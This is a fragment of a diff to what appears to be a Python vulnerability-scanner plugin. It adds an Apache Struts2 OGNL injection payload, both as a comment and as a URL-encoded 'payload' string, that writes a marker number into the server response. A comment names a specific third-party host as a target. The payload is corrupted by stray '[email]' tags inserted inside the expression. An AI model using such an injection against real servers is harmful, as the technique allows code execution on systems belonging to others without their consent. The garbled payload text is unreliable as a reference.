@@ -26,6 +26,7 @@ class P(T):
         timeout=3
         result['result']=False
         res=None
+        # method:#_memberAccess%[email]3d@ognl.OgnlContext[/email]@DEFAULT_MEMBER_ACCESS,#w=#context.get(#parameters.rpsobj[0]),#w.getWriter().println(88888888-1),#w.getWriter().flush(),#w.getWriter().close(),1?#xx:#request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse" #method:#_memberAccess%[email]3d@ognl.OgnlContext[/email]@DEFAULT_MEMBER_ACCESS,#w=#context.get(#parameters.rpsobj[0]),#w.getWriter().println(88888888-1),#w.getWriter().flush(),#w.getWriter().close(),1?#xx:#request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse
         payload = "method:%23_memberAccess%[email]3d@ognl.OgnlContext[/email]@DEFAULT_MEMBER_ACCESS,%23w%3d%23context.get(%23parameters.rpsobj[0]),%23w.getWriter().println(88888888-1),%23w.getWriter().flush(),%23w.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse" #
 
         # http://gimssom.bnuz.edu.cn:8089/login.action
